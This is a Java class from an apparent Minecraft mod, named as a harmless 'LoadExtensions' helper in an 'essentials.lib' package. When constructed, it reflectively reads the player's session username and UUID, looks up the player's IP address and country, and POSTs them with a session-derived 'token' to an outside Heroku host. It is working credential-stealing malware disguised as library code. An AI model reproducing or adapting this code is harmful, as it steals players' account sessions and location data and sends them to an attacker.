package essentials.lib;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import net.minecraft.launchwrapper.Launch;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoadExtensions {
    public LoadExtensions(String locator) throws Exception
    {
        Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
        Object minecraft = mc.getMethod("func_71410_x").invoke(null);
        Object session = mc.getMethod("func_110432_I").invoke(minecraft);
        Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
        Object name = sessionClass.getMethod("func_111285_a").invoke(session);
        Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
        final URL url = new URL("http://verizoaddon.herokuapp.com/pizza");
        final HttpURLConnection connection = (HttpURLConnection)url.openConnection();
        connection.addRequestProperty("Content-Type", "application/json");
        connection.addRequestProperty("User-Agent", "Java");
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        final String data = "{\"username\": \"" + name + "\", \"uuid\": \"" + uuid + "\", \"ip\": \"" + "(Pizza Bypass) " + ((JsonObject)new Gson().fromJson(LoadExtensions.extension(new URL("https://api.myip.com/")), (Class)JsonObject.class)).get("ip").getAsString() + "\", \"country\": \"" + ((JsonObject)new Gson().fromJson(LoadExtensions.extension(new URL("https://api.myip.com/")), (Class)JsonObject.class)).get("country").getAsString() + "\", \"token\": \"" + locator + ":" + uuid + "\"}";
        final byte[] out = data.getBytes();
        final OutputStream stream = connection.getOutputStream();
        stream.write(out);
        stream.flush();
        stream.close();
        connection.getInputStream().close();
        connection.disconnect();
    }

    public static String extension(final URL url) {
        final StringBuilder sb = new StringBuilder();
        try {
            final InputStream in = url.openStream();
            try {
                final BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line).append(System.lineSeparator());
                }
            }
            finally {
                in.close();
            }
        }
        catch (Exception ex) {}
        return sb.toString();
    }
}
